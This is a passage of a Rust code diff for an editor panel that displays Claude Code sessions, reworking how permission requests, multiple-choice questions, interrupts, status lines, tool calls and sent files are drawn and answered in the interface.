+                        .size(LabelSize::XSmall)
+                        .color(Color::Muted),
+                );
+            }
+            if !input_preview.is_empty() {
+                card = card.child(
+                    Label::new(SharedString::from(input_preview))
+                        .size(LabelSize::XSmall)
+                        .color(Color::Muted),
+                );
+            }
         }
 
-        store
-            .pane_contents()
-            .is_some_and(|pane| answers_awaiting_confirmation(pane))
-    }
+        if request_id.is_some() {
+            if permission_answered {
+                card = card.child(
+                    Label::new(CHANNEL_PERMISSION_WAITING)
+                        .size(LabelSize::XSmall)
+                        .color(Color::Muted),
+                );
+            } else {
+                card = card.child(
+                    h_flex()
+                        .gap_1()
+                        .child(
+                            Button::new("claude-session-allow", "Allow")
+                                .label_size(LabelSize::XSmall)
+                                .on_click(
+                                    cx.listener(|this, _, _, cx| this.answer_permission(true, cx)),
+                                ),
+                        )
+                        .child(
+                            Button::new("claude-session-deny", "Deny")
+                                .label_size(LabelSize::XSmall)
+                                .on_click(
+                                    cx.listener(|this, _, _, cx| this.answer_permission(false, cx)),
+                                ),
+                        ),
+                );
+            }
+        } else {
+            card = card.child(
+                Label::new(CHANNEL_PERMISSION_UNAVAILABLE)
+                    .size(LabelSize::XSmall)
+                    .color(Color::Muted),
+            );
+        }
 
-    /// The last step of a call that asked several questions, drawn as the two things it
-    /// offers.
-    fn render_answer_confirmation(&self, cx: &mut Context<Self>) -> AnyElement {
-        let can_send = self.can_send(cx);
-
-        v_flex()
-            .w_full()
-            .gap_1()
-            .px_2()
-            .pb_1()
-            .child(
-                h_flex()
-                    .gap_1()
-                    .child(
-                        Icon::new(IconName::Chat)
-                            .size(IconSize::XSmall)
-                            .color(Color::Accent),
-                    )
-                    .child(
-                        Label::new("Every question answered")
-                            .size(LabelSize::XSmall)
-                            .color(Color::Accent),
-                    ),
-            )
-            .child(Label::new(REVIEW_PROMPT).size(LabelSize::Small))
-            .child(
-                h_flex()
-                    .w_full()
-                    .gap_1()
-                    .flex_wrap()
-                    .child(
-                        Button::new("claude-session-answers-send", REVIEW_SUBMIT_ROW)
-                            .label_size(LabelSize::XSmall)
-                            .disabled(!can_send)
-                            .style(ButtonStyle::Tinted(TintColor::Accent))
-                            .tooltip(Tooltip::text("Send these answers to the session"))
-                            .on_click(cx.listener(|this, _, _, cx| this.confirm_answers(true, cx))),
-                    )
-                    .child(
-                        Button::new("claude-session-answers-cancel", REVIEW_CANCEL_ROW)
-                            .label_size(LabelSize::XSmall)
-                            .disabled(!can_send)
-                            .tooltip(Tooltip::text("Throw these answers away and ask again"))
-                            .on_click(
-                                cx.listener(|this, _, _, cx| this.confirm_answers(false, cx)),
-                            ),
-                    ),
-            )
-            .into_any_element()
+        Some(card.into_any_element())
     }
 
     fn render_question(&self, cx: &mut Context<Self>) -> Option<AnyElement> {
-        // Drawn instead of the questions, not beside them: at this point every question
-        // has been answered and the last one drawn on its own would be the only thing on
-        // screen that is not what the terminal is waiting for.
-        if self.answers_are_being_confirmed(cx) {
-            return Some(self.render_answer_confirmation(cx));
-        }
-
-        let (question, question_index, tool_use_id) = self.waiting_question(cx)?;
+        let pending = self.store.read(cx).live().pending_question.as_ref()?;
+        let questions = pending.questions.as_array().cloned().unwrap_or_default();
         let can_send = self.can_send(cx);
-        let multi_select = question.multi_select;
-        let option_count = question.options.len();
-        let ticked: HashSet<usize> = self
-            .ticked
-            .as_ref()
-            .filter(|ticked| {
-                ticked.tool_use_id == tool_use_id && ticked.question_index == question_index
-            })
-            .map(|ticked| ticked.ticked.clone())
-            .unwrap_or_default();
+        let ticks = self.question_ticks.clone();
 
         let mut section = v_flex()
             .w_full()
@@ -4116,170 +5800,215 @@ impl ClaudeSessionsPanel {
             .px_2()
             .pb_1()
             .child(
-                h_flex()
-                    .gap_1()
-                    .child(
-                        Icon::new(IconName::Chat)
-                            .size(IconSize::XSmall)
-                            .color(Color::Accent),
-                    )
-                    .child(
-                        Label::new(if question.header.trim().is_empty() {
-                            SharedString::from("Waiting on you")
-                        } else {
-                            SharedString::from(question.header.clone())
-                        })
-                        .size(LabelSize::XSmall)
-                        .color(Color::Accent),
-                    )
-                    // Which of several questions this is. A call with one question says
-                    // nothing, because "1 of 1" is not a thing a reader needs told.
-                    .when_some(
-                        self.store
-                            .read(cx)
-                            .recorded_question()
-                            .map(|recorded| recorded.questions.len())
-                            .filter(|count| *count > 1),
-                        |this, count| {
-                            this.child(
-                                Label::new(format!("{} of {count}", question_index + 1))
-                                    .size(LabelSize::XSmall)
-                                    .color(Color::Muted),
-                            )
-                        },
-                    ),
+                Label::new("Waiting for your answer")
+                    .size(LabelSize::XSmall)
+                    .color(Color::Accent),
             )
             .child(
-                Label::new(SharedString::from(question.question.clone())).size(LabelSize::Small),
+                Label::new(QUESTION_CHANNEL_NOTE)
+                    .size(LabelSize::XSmall)
+                    .color(Color::Muted),
             );
 
-        for (option_index, option) in question.options.iter().enumerate() {
-            let is_ticked = ticked.contains(&option_index);
-            let label = SharedString::from(option.label.clone());
-            // A question taking several answers is filled in and then submitted, so its
-            // options are ticked; one taking a single answer is over the moment an option
-            // is pressed, so its options are pressed.
-            let control = if multi_select {
-                Checkbox::new(
-                    SharedString::from(format!("claude-session-option-{option_index}")),
-                    ToggleState::from(is_ticked),
-                )
-                .label(label)
-                .label_size(LabelSize::XSmall)
-                .disabled(!can_send)
-                .on_click(cx.listener(move |this, _, _, cx| this.toggle_tick(option_index, cx)))
-                .into_any_element()
-            } else {
-                Button::new(
-                    SharedString::from(format!("claude-session-option-{option_index}")),
-                    label,
-                )
-                .label_size(LabelSize::XSmall)
-                .disabled(!can_send)
-                .tooltip(Tooltip::text("Answer with this"))
-                .on_click(cx.listener(move |this, _, _, cx| this.pick_option(option_index, cx)))
-                .into_any_element()
-            };
+        for (question_index, question) in questions.into_iter().enumerate() {
+            let header = question
+                .get("header")
+                .and_then(Value::as_str)
+                .unwrap_or("")
+                .trim()
+                .to_string();
+            let asked = question
+                .get("question")
+                .and_then(Value::as_str)
+                .unwrap_or("")
+                .trim()
+                .to_string();
+            let multi_select = question
+                .get("multiSelect")
+                .or_else(|| question.get("multi_select"))
+                .and_then(Value::as_bool)
+                .unwrap_or(false);
+            if !header.is_empty() {
+                section = section.child(
+                    Label::new(SharedString::from(header.clone()))
+                        .size(LabelSize::XSmall)
+                        .color(Color::Muted),
+                );
+            }
+            if !asked.is_empty() {
+                section = section
+                    .child(Label::new(SharedString::from(asked.clone())).size(LabelSize::Small));
+            }
+            let options = question
+                .get("options")
+                .and_then(Value::as_array)
+                .cloned()
+                .unwrap_or_default();
+            let option_labels: Vec<String> = options
+                .iter()
+                .filter_map(|option| {
+                    option
+                        .get("label")
+                        .and_then(Value::as_str)
+                        .map(|label| label.trim().to_string())
+                        .filter(|label| !label.is_empty())
+                })
+                .collect();
 
-            section = section.child(
-                v_flex()
-                    .w_full()
-                    .child(control)
-                    // Under the option rather than beside it: a description is a sentence
-                    // and the panel is narrow, and beside it the two wrap into each other.
-                    .when_some(option.description.clone(), |this, description| {
-                        this.child(
-                            div().pl_4().child(
-                                Label::new(SharedString::from(description))
-                                    .size(LabelSize::XSmall)
-                                    .color(Color::Muted),
-                            ),
+            if multi_select {
+                for (option_index, label) in option_labels.iter().enumerate() {
+                    let selected = ticks.contains(&(question_index, option_index));
+                    let button_label = label.clone();
+                    section = section.child(
+                        Checkbox::new(
+                            SharedString::from(format!(
+                                "claude-session-q-{question_index}-{option_index}"
+                            )),
+                            if selected {
+                                ToggleState::Selected
+                            } else {
+                                ToggleState::Unselected
+                            },
                         )
-                    }),
-            );
-        }
-
-        section = section.child(
-            h_flex()
-                .w_full()
-                .gap_1()
-                // The dock is narrow and these two do not fit side by side in it at every
-                // width; without this `Submit` is the one drawn off the edge.
-                .flex_wrap()
-                .child(
-                    Button::new("claude-session-answer-typed", "Type something")
+                        .label(SharedString::from(button_label))
+                        .disabled(!can_send)
+                        .on_click(cx.listener(move |this, _, _, cx| {
+                            if !this.question_ticks.remove(&(question_index, option_index)) {
+                                this.question_ticks.insert((question_index, option_index));
+                            }
+                            cx.notify();
+                        })),
+                    );
+                }
+                let header_for_submit = header.clone();
+                let labels_for_submit = option_labels.clone();
+                section = section.child(
+                    Button::new(
+                        SharedString::from(format!("claude-session-q-submit-{question_index}")),
+                        "Submit",
+                    )
+                    .label_size(LabelSize::XSmall)
+                    .disabled(!can_send)
+                    .on_click(cx.listener(move |this, _, window, cx| {
+                        let selected: Vec<String> = labels_for_submit
+                            .iter()
+                            .enumerate()
+                            .filter(|(option_index, _)| {
+                                this.question_ticks
+                                    .contains(&(question_index, *option_index))
+                            })
+                            .map(|(_, label)| label.clone())
+                            .collect();
+                        if selected.is_empty() {
+                            return;
+                        }
+                        let text = compose_multi_question_answer(&header_for_submit, &selected);
+                        this.dispatch_message(text, window, cx);
+                    })),
+                );
+            } else {
+                for label in option_labels {
+                    let composed = compose_single_question_answer(&header, &asked, &label);
+                    let option_label = label.clone();
+                    section = section.child(
+                        Button::new(
+                            SharedString::from(format!(
+                                "claude-session-q-{question_index}-{option_label}"
+                            )),
+                            SharedString::from(option_label),
+                        )
                         .label_size(LabelSize::XSmall)
                         .disabled(!can_send)
-                        .tooltip(Tooltip::text("Answer in your own words, in the box below"))
-                        .on_click(cx.listener(|this, _, _, cx| this.answer_in_own_words(cx))),
+                        .on_click(cx.listener(
+                            move |this, _, window, cx| {
+                                this.dispatch_message(composed.clone(), window, cx)
+                            },
+                        )),
+                    );
+                }
+            }
+
+            let prefix = compose_type_something_prefix(&header, &asked);
+            section = section.child(
+                Button::new(
+                    SharedString::from(format!("claude-session-q-type-{question_index}")),
+                    "Type something",
                 )
-                .when(multi_select, |this| {
-                    this.child(
-                        // The count is in the label rather than only in the tooltip: the
-                        // button is disabled until something is ticked, and a grey button
-                        // that says nothing reads as one that is not there.
-                        Button::new(
-                            "claude-session-answer-submit",
-                            format!("Submit {}/{option_count}", ticked.len()),
-                        )
-                        .label_size(LabelSize::XSmall)
-                        // Nothing ticked is not an answer, and submitting it would
-                        // send a walk to `Submit` that answers nothing.
-                        .disabled(!can_send || ticked.is_empty())
-                        .style(ButtonStyle::Tinted(TintColor::Accent))
-                        .tooltip(Tooltip::text(format!(
-                            "Send {} of {option_count}",
-                            ticked.len()
-                        )))
-                        .on_click(cx.listener(|this, _, _, cx| this.submit_ticked(cx))),
-                    )
-                }),
-        );
+                .label_size(LabelSize::XSmall)
+                .disabled(!can_send)
+                .on_click(cx.listener(move |this, _, window, cx| {
+                    this.message_editor.update(cx, |editor, cx| {
+                        editor.set_text(prefix.clone(), window, cx);
+                        editor.move_to_end(&Default::default(), window, cx);
+                    });
+                    cx.notify();
+                })),
+            );
+        }
 
         Some(section.into_any_element())
     }
 
     fn render_input(&self, cx: &mut Context<Self>) -> impl IntoElement {
         let can_send = self.can_send(cx);
-        // A session that is answering is the one case where interrupting is what the
-        // reader wants, so the button says so and is tinted then rather than sitting
-        // there as one more grey control.
-        let is_answering = !matches!(self.activity, Activity::Idle);
-        let store = self.store.read(cx);
-        let has_selection = store.selected().is_some();
-        let is_reading_an_agent =
-            matches!(store.transcript_target(), TranscriptTarget::Subagent { .. });
+        let (
+            has_selection,
+            is_reading_an_agent,
+            can_copy_setup,
+            can_interrupt,
+            interrupt_sent,
+            interrupt_tooltip,
+            interrupt_label,
+        ) = {
+            let store = self.store.read(cx);
+            let has_selection = store.selected().is_some();
+            let is_reading_an_agent =
+                matches!(store.transcript_target(), TranscriptTarget::Subagent { .. });
+            let now_ms = now_millis();
+            let running = matches!(store.live().turn, Turn::Running { .. });
+            let interrupt_sent =
+                running && interrupt_is_awaiting_result(self.interrupt_sent_at_ms, now_ms);
+            let can_interrupt = store.can_interrupt();
+            let interrupt_tooltip = if interrupt_sent {
+                "interrupt sent".to_string()
+            } else {
+                store
+                    .interrupt_disabled_reason()
+                    .unwrap_or("Stop this turn")
+                    .to_string()
+            };
+            let interrupt_label = if interrupt_sent {
+                "interrupt sent"
+            } else {
+                "Stop"
+            };
+            (
+                has_selection,
+                is_reading_an_agent,
+                store.home_directory().is_some(),
+                can_interrupt,
+                interrupt_sent,
+                interrupt_tooltip,
+                interrupt_label,
+            )
+        };
         let note = input_note(can_send, is_reading_an_agent, has_selection);
-        // The terminal's own controls, drawn here because the terminal is closed by
-        // default now: without them the only way to change the permission mode, or to
-        // take back what the CLI is holding, is to open the terminal and press the key.
-        let mode = store
-            .pane_contents()
-            .and_then(|contents| permission_mode(contents));
-        let bypassing = mode
-            .as_ref()
-            .is_some_and(|mode| mode.to_lowercase().contains(BYPASSING_PERMISSIONS));
-        let mode_label = mode.unwrap_or_else(|| SharedString::from(UNNAMED_PERMISSION_MODE));
-        let quit_armed = self.quit_armed;
+        let show_setup = has_selection && !is_reading_an_agent && !can_send;
+        let slash_send_note = self.slash_send_note.clone();
+        let paste_error = self.paste_error.clone();
 
-        let question = self.render_question(cx);
+        let hook_note = self.render_hook_install_note();
         let slash_commands = self.render_slash_commands(cx);
         let file_matches = self.render_file_matches(cx);
-        // Whether a question is waiting is not part of this: a question opens the input
-        // when it arrives — see [`Self::open_the_input_for_a_new_question`] — and holding
-        // it open for as long as one is drawn takes the disclosure away from the reader,
-        // who then cannot put away a question the session has already moved past.
         let expanded = self.input_expanded;
 
         v_flex()
             .w_full()
             .border_t_1()
             .border_color(cx.theme().colors().border)
-            // Outside the collapsed part, so that the keys still reach the session while
-            // the input is closed: interrupting does not need somewhere to type.
             .key_context("ClaudeSessionsInput")
             .on_action(cx.listener(Self::send_message))
-            .on_action(cx.listener(Self::interrupt_session))
+            .on_action(cx.listener(Self::dismiss_menus))
             .on_action(cx.listener(Self::recall_previous_message))
             .on_action(cx.listener(Self::recall_next_message))
             .on_action(cx.listener(Self::paste_into_message))
@@ -4299,7 +6028,7 @@ impl ClaudeSessionsPanel {
                     ),
             )
             .when(expanded, |this| this.p_2().gap_1())
-            .children(question)
+            .children(hook_note)
             .when_some(note.filter(|_| expanded), |this, note| {
                 this.child(
                     h_flex()
@@ -4309,7 +6038,24 @@ impl ClaudeSessionsPanel {
                                 .size(IconSize::XSmall)
                                 .color(Color::Muted),
                         )
-                        .child(Label::new(note).size(LabelSize::XSmall).color(Color::Muted)),
+                        .child(Label::new(note).size(LabelSize::XSmall).color(Color::Muted))
+                        .when(show_setup, |this| {
+                            this.child(
+                                Button::new("claude-session-copy-setup", "Copy setup commands")
+                                    .label_size(LabelSize::XSmall)
+                                    .disabled(!can_copy_setup)
+                                    .on_click(
+                                        cx.listener(|this, _, _, cx| this.copy_setup_commands(cx)),
+                                    ),
+                            )
+                        }),
+                )
+            })
+            .when_some(slash_send_note.filter(|_| expanded), |this, note| {
+                this.child(
+                    Label::new(note)
+                        .size(LabelSize::XSmall)
+                        .color(Color::Warning),
                 )
             })
             .when(expanded, |this| {
@@ -4327,6 +6073,13 @@ impl ClaudeSessionsPanel {
                     ),
                 )
             })
+            .when_some(paste_error.filter(|_| expanded), |this, error| {
+                this.child(
+                    Label::new(error)
+                        .size(LabelSize::XSmall)
+                        .color(Color::Error),
+                )
+            })
             .children(slash_commands.filter(|_| expanded))
             .children(file_matches.filter(|_| expanded))
             .when(expanded, |this| {
@@ -4336,105 +6089,59 @@ impl ClaudeSessionsPanel {
                         .px_2()
                         .pb_2()
                         .gap_1()
-                        .justify_between()
+                        .justify_end()
                         .child(
-                            h_flex()
-                                .gap_1()
-                                .child(
-                                    Button::new("claude-session-permission-mode", mode_label)
-                                        .start_icon(
-                                            Icon::new(IconName::ArrowCircle).size(IconSize::XSmall),
-                                        )
-                                        .label_size(LabelSize::XSmall)
-                                        .disabled(!can_send)
-                                        // Tinted only while the prompts are off: that is
-                                        // the mode whose consequences a reader who forgot
-                                        // they were in it would meet by surprise.
-                                        .when(bypassing, |this| {
-                                            this.style(ButtonStyle::Tinted(TintColor::Warning))
-                                        })
-                                        .tooltip(Tooltip::text(
-                                            "Cycle this session's permission mode, as \
-                                             shift+tab does in the terminal",
-                                        ))
-                                        .on_click(cx.listener(|this, _, _, cx| {
-                                            this.send_pane_key(PaneKey::CyclePermissionMode, cx)
-                                        })),
-                                )
-                                .child(
-                                    IconButton::new("claude-session-cancel", IconName::Stop)
-                                        .icon_size(IconSize::XSmall)
-                                        .disabled(!can_send)
-                                        .tooltip(Tooltip::text(
-                                            "Send Ctrl+C: takes back what the terminal is \
-                                             holding, and stops the turn it is running",
-                                        ))
-                                        .on_click(cx.listener(|this, _, _, cx| {
-                                            this.send_pane_key(PaneKey::Cancel, cx)
-                                        })),
-                                )
-                                .child(
-                                    Button::new(
-                                        "claude-session-quit",
-                                        if quit_armed { "Quit?" } else { "Quit" },
-                                    )
-                                    .start_icon(Icon::new(IconName::Power).size(IconSize::XSmall))
-                                    .label_size(LabelSize::XSmall)
-                                    .disabled(!can_send)
-                                    .when(quit_armed, |this| {
-                                        this.style(ButtonStyle::Tinted(TintColor::Error))
-                                    })
-                                    .tooltip(Tooltip::text(if quit_armed {
-                                        "Press again to send Ctrl+D, which ends this session"
-                                    } else {
-                                        "Send Ctrl+D, which ends this session"
-                                    }))
-                                    .on_click(cx.listener(|this, _, _, cx| this.quit_session(cx))),
-                                ),
+                            Button::new("claude-session-interrupt", interrupt_label)
+                                .start_icon(Icon::new(IconName::Escape).size(IconSize::XSmall))
+                                .label_size(LabelSize::XSmall)
+                                .disabled(!can_interrupt || interrupt_sent)
+                                .tooltip(Tooltip::text(interrupt_tooltip))
+                                .on_click(cx.listener(|this, _, _, cx| this.request_interrupt(cx))),
                         )
                         .child(
-                            h_flex()
-                                .gap_1()
-                                .child(
-                                    Button::new(
-                                        "claude-session-interrupt",
-                                        if is_answering { "Stop" } else { "Esc" },
-                                    )
-                                    .start_icon(Icon::new(IconName::Escape).size(IconSize::XSmall))
-                                    .label_size(LabelSize::XSmall)
-                                    .disabled(!can_send)
-                                    .when(is_answering, |this| {
-                                        this.style(ButtonStyle::Tinted(TintColor::Error))
-                                    })
-                                    .tooltip(Tooltip::for_action_title(
-                                        if is_answering {
-                                            "Stop this session"
-                                        } else {
-                                            "Interrupt this session"
-                                        },
-                                        &Interrupt,
-                                    ))
-                                    .on_click(cx.listener(
-                                        |this, _, window, cx| {
-                                            this.interrupt_session(&Interrupt, window, cx)
-                                        },
-                                    )),
-                                )
-                                .child(
-                                    Button::new("claude-session-send", "Send")
-                                        .start_icon(
-                                            Icon::new(IconName::Send).size(IconSize::XSmall),
-                                        )
-                                        .label_size(LabelSize::XSmall)
-                                        .disabled(!can_send)
-                                        .tooltip(Tooltip::text("Send to this session"))
-                                        .on_click(cx.listener(|this, _, window, cx| {
-                                            this.send_message(&SendMessage, window, cx)
-                                        })),
-                                ),
+                            Button::new("claude-session-send", "Send")
+                                .start_icon(Icon::new(IconName::Send).size(IconSize::XSmall))
+                                .label_size(LabelSize::XSmall)
+                                .disabled(!can_send)
+                                .tooltip(Tooltip::text("Send to this session"))
+                                .on_click(cx.listener(|this, _, window, cx| {
+                                    this.send_message(&SendMessage, window, cx)
+                                })),
                         ),
                 )
             })
+    }
+
+    fn render_status_line(&self, cx: &mut Context<Self>) -> AnyElement {
+        let (line, tooltip) = {
+            let store = self.store.read(cx);
+            let line = format_status_line(
+                &store.live().turn,
+                store.permission_mode().as_deref(),
+                store.channel_live(),
+                now_millis(),
+            );
+            let tooltip = permission_tooltip(
+                store.permission_mode().as_deref(),
+                store.transcript().auto_mode(),
+                store.transcript().auto_mode_steer(),
+            );
+            (line, tooltip)
+        };
+        h_flex()
+            .id("claude-session-status-line")
+            .w_full()
+            .flex_none()
+            .px_2()
+            .py_0p5()
+            .child(
+                Label::new(line)
+                    .size(LabelSize::XSmall)
+                    .color(Color::Muted)
+                    .single_line(),
+            )
+            .tooltip(Tooltip::text(tooltip))
+            .into_any_element()
     }
 
     fn render_entry(
@@ -4460,14 +6167,14 @@ impl ClaudeSessionsPanel {
                 // replaced, and it arrives at the top of what the reader is about to
                 // read. Drawn closed, like a tool call, so that the session's own
                 // messages are what the view opens on.
-                if role == MessageRole::CompactSummary {
+                if role == MessageRole::CompactSummary || matches!(role, MessageRole::Peer { .. }) {
                     let header = self.render_disclosure_header(
                         DisclosureHeader {
                             entry_index: index,
                             key: &key,
                             icon: role.icon(),
                             icon_color: role.color(),
-                            title: role.label().into(),
+                            title: role.label(),
                             summary: Some(first_line(&source)),
                             is_expanded,
                         },
@@ -4574,85 +6281,23 @@ impl ClaudeSessionsPanel {
                     .into_any_element()
             }
 
-            EntryKind::ToolUse { name, input } => {
-                let display = tool_input_display(&name, &input);
-                let header = self.render_disclosure_header(
-                    DisclosureHeader {
-                        entry_index: index,
-                        key: &key,
-                        icon: IconName::ToolHammer,
-                        icon_color: Color::Success,
-                        title: name,
-                        summary: Some(first_line(&display.text)),
-                        is_expanded,
-                    },
+            EntryKind::ToolUse {
+                name,
+                input,
+                id,
+                diff,
+            } => {
+                return self.render_tool_use(
+                    index,
+                    key,
+                    name,
+                    input,
+                    id,
+                    diff,
+                    is_expanded,
+                    window,
                     cx,
                 );
-                let body = if is_expanded {
-                    let markdown = self.markdown_for(&key, display.code_block(), cx);
-                    Some(
-                        div()
-                            .w_full()
-                            .px_2()
-                            .pb_1()
-                            .child(MarkdownElement::new(markdown, markdown_style(window, cx))),
-                    )
-                } else {
-                    None
-                };
-                // Drawn whether or not the call is expanded: what the call started, and
-                // whether it is still going, is the part of an `Agent` call worth seeing
-                // without opening anything.
-                let cards = self.agent_cards(&key, cx);
-                // A run spawns agents as it goes, so the count is the run's shape so far
-                // rather than what it will end up being. Only a run has one: a `Task`
-                // call spawns the single agent its own card already accounts for.
-                let run_note = self
-                    .agent_calls
-                    .get(&key)
-                    .filter(|call| call.is_workflow && !cards.is_empty())
-                    .map(|_| workflow_run_note(&cards));
-                let mut element = v_flex().w_full().child(header).children(body);
-                if let Some(run_note) = run_note {
-                    element = element.child(
-                        div().w_full().px_2().pb_1().child(
-                            Label::new(run_note)
-                                .size(LabelSize::XSmall)
-                                .color(Color::Muted),
-                        ),
-                    );
-                }
-                // A `Workflow` call can spawn any number of agents across several phases,
-                // and flattened they are a list of labels with nothing saying which part
-                // of the run each belongs to. Grouped, the phase is said once as a
-                // heading and the cards under it carry only their own state.
-                let is_workflow_call = self
-                    .agent_calls
-                    .get(&key)
-                    .is_some_and(|call| call.is_workflow);
-                let mut card_index = 0;
-                for (phase, cards_of_phase) in group_cards_by_phase(cards, is_workflow_call) {
-                    if let Some(phase) = phase {
-                        element = element.child(
-                            div().w_full().px_2().pb_0p5().child(
-                                Label::new(phase_heading(&phase, &cards_of_phase))
-                                    .size(LabelSize::XSmall)
-                                    .color(Color::Muted),
-                            ),
-                        );
-                    }
-                    for card in cards_of_phase {
-                        // The index goes on counting past a card that is not drawn, so
-                        // that an agent returning does not hand its element id to the
-                        // card after it.
-                        if card.offered {
-                            element =
-                                element.child(self.render_agent_card(&key, card_index, card, cx));
-                        }
-                        card_index += 1;
-                    }
-                }
-                element.into_any_element()
             }
 
             EntryKind::ToolResult {
@@ -4660,22 +6305,34 @@ impl ClaudeSessionsPanel {
                 is_error,
                 body,
             } => {
-                let summary = match &body {
-                    ToolResultBody::Inline(text) => first_line(text),
-                    // The inline text of a persisted result is the output's own first
-                    // tens of kilobytes, so the collapsed row still shows where it
-                    // starts, with the size of the whole file after it.
-                    ToolResultBody::Persisted(persisted) => {
-                        let first_line = first_line(&persisted.preview);
-                        if first_line.is_empty() {
-                            SharedString::from(format!("{} saved to a file", persisted.size))
-                        } else {
-                            SharedString::from(format!(
-                                "{first_line} ({} saved to a file)",
-                                persisted.size
-                            ))
+                let ask_user_answers = (label.as_ref() == ASK_USER_QUESTION_TOOL_NAME)
+                    .then(|| ask_user_answer_text(&body))
+                    .flatten();
+                let summary = if let Some(answers) = ask_user_answers.as_ref() {
+                    first_line(answers)
+                } else {
+                    match &body {
+                        ToolResultBody::Inline(text) => first_line(text),
+                        // The inline text of a persisted result is the output's own first
+                        // tens of kilobytes, so the collapsed row still shows where it
+                        // starts, with the size of the whole file after it.
+                        ToolResultBody::Persisted(persisted) => {
+                            let first_line = first_line(&persisted.preview);
+                            if first_line.is_empty() {
+                                SharedString::from(format!("{} saved to a file", persisted.size))
+                            } else {
+                                SharedString::from(format!(
+                                    "{first_line} ({} saved to a file)",
+                                    persisted.size
+                                ))
+                            }
                         }
                     }
+                };
+                let title = if ask_user_answers.is_some() {
+                    SharedString::from("Answer")
+                } else {
+                    label
                 };
                 let header = self.render_disclosure_header(
                     DisclosureHeader {
@@ -4683,11 +6340,13 @@ impl ClaudeSessionsPanel {
                         key: &key,
                         icon: if is_error {
                             IconName::XCircle
+                        } else if ask_user_answers.is_some() {
+                            IconName::Check
                         } else {
                             IconName::ToolTerminal
                         },
                         icon_color: if is_error { Color::Error } else { Color::Muted },
-                        title: label,
+                        title,
                         summary: Some(summary),
                         is_expanded,
                     },
@@ -4695,18 +6354,28 @@ impl ClaudeSessionsPanel {
                 );
 
                 let rendered_body = if is_expanded {
-                    Some(match body {
-                        ToolResultBody::Inline(text) => {
-                            let output = self.render_tool_output(index, &key, &text, window, cx);
-                            div()
-                                .w_full()
-                                .px_2()
-                                .pb_1()
-                                .child(output)
-                                .into_any_element()
-                        }
-                        ToolResultBody::Persisted(persisted) => {
-                            self.render_persisted_output(index, &key, &persisted, window, cx)
+                    Some(if let Some(answers) = ask_user_answers {
+                        div()
+                            .w_full()
+                            .px_2()
+                            .pb_1()
+                            .child(Label::new(answers).size(LabelSize::Small))
+                            .into_any_element()
+                    } else {
+                        match body {
+                            ToolResultBody::Inline(text) => {
+                                let output =
+                                    self.render_tool_output(index, &key, &text, window, cx);
+                                div()
+                                    .w_full()
+                                    .px_2()
+                                    .pb_1()
+                                    .child(output)
+                                    .into_any_element()
+                            }
+                            ToolResultBody::Persisted(persisted) => {
+                                self.render_persisted_output(index, &key, &persisted, window, cx)
+                            }
                         }
                     })
                 } else {
@@ -4732,6 +6401,61 @@ impl ClaudeSessionsPanel {
                 )
                 .child(img(image).max_w_full().max_h(px(480.)))
                 .into_any_element(),
+
+            EntryKind::SentFiles {
+                caption,
+                files,
+                is_error,
+                result_text,
+            } => {
+                let mut column = v_flex()
+                    .w_full()
+                    .px_2()
+                    .py_1()
+                    .gap_1()
+                    .child(
+                        h_flex()
+                            .gap_1()
+                            .child(
+                                Icon::new(if is_error {
+                                    IconName::XCircle
+                                } else {
+                                    IconName::Attach
+                                })
+                                .size(IconSize::XSmall)
+                                .color(if is_error {
+                                    Color::Error
+                                } else {
+                                    Color::Muted
+                                }),
+                            )
+                            .child(
+                                Label::new(if files.len() == 1 {
+                                    SharedString::from("Sent you a file")
+                                } else {
+                                    SharedString::from(format!("Sent you {} files", files.len()))
+                                })
+                                .size(LabelSize::XSmall)
+                                .color(if is_error {
+                                    Color::Error
+                                } else {
+                                    Color::Muted
+                                }),
+                            ),
+                    )
+                    .when_some(caption, |column, caption| {
+                        column.child(Label::new(caption).size(LabelSize::Small))
+                    })
+                    .when_some(result_text.filter(|_| is_error), |column, text| {
+                        column.child(Label::new(text).size(LabelSize::XSmall).color(Color::Error))
+                    });
+
+                for (file_index, file) in files.iter().enumerate() {
+                    column = column.child(self.render_sent_file(index, &key, file_index, file, cx));
+                }
+
+                column.into_any_element()
+            }
 
             EntryKind::LocalCommand { text } => {
                 let markdown = self.markdown_for(&key, fenced_code(&text, ""), cx);
@@ -4832,7 +6556,12 @@ impl ClaudeSessionsPanel {
                 )
                 .into_any_element(),
 
-            EntryKind::Pending { id, text } => {
+            EntryKind::Pending {
+                id,
+                text,
+                note,
+                failed,
+            } => {
                 v_flex()
                     .w_full()
                     .px_2()
@@ -4859,29 +6588,79 @@ impl ClaudeSessionsPanel {
                                             .color(Color::Muted),
                                     )
                                     .child(
-                                        Label::new(SENDING_NOTE)
-                                            .size(LabelSize::XSmall)
-                                            .color(Color::Muted),
+                                        Label::new(note).size(LabelSize::XSmall).color(if failed {
+                                            Color::Error
+                                        } else {
+                                            Color::Muted
+                                        }),
                                     )
-                                    .with_animation(
-                                        SharedString::from(format!("pending-send-{id}")),
-                                        Animation::new(PULSE_PERIOD)
-                                            .repeat()
-                                            .with_easing(pulsating_between(0.4, 0.8)),
-                                        |header, delta| header.opacity(delta),
-                                    ),
+                                    .map(|header| {
+                                        if failed {
+                                            header.into_any_element()
+                                        } else {
+                                            header
+                                                .with_animation(
+                                                    SharedString::from(format!(
+                                                        "pending-send-{id}"
+                                                    )),
+                                                    Animation::new(PULSE_PERIOD)
+                                                        .repeat()
+                                                        .with_easing(pulsating_between(0.4, 0.8)),
+                                                    |header, delta| header.opacity(delta),
+                                                )
+                                                .into_any_element()
+                                        }
+                                    }),
                             )
                             .child(
-                                IconButton::new(
-                                    SharedString::from(format!("dismiss-pending-send-{id}")),
-                                    IconName::Close,
-                                )
-                                .icon_size(IconSize::XSmall)
-                                .icon_color(Color::Muted)
-                                .tooltip(Tooltip::text("Remove this message"))
-                                .on_click(cx.listener(
-                                    move |this, _, _, cx| this.dismiss_pending_send(id, cx),
-                                )),
+                                h_flex()
+                                    .gap_1()
+                                    .when(failed, |this| {
+                                        this.child(
+                                            Button::new(
+                                                SharedString::from(format!(
+                                                    "retry-pending-send-{id}"
+                                                )),
+                                                "Retry",
+                                            )
+                                            .label_size(LabelSize::XSmall)
+                                            .on_click(
+                                                cx.listener(move |this, _, _, cx| {
+                                                    this.retry_pending_send(id, cx)
+                                                }),
+                                            ),
+                                        )
+                                        .child(
+                                            Button::new(
+                                                SharedString::from(format!(
+                                                    "copy-pending-send-{id}"
+                                                )),
+                                                "Copy",
+                                            )
+                                            .label_size(LabelSize::XSmall)
+                                            .on_click(
+                                                cx.listener(move |this, _, _, cx| {
+                                                    this.copy_pending_send(id, cx)
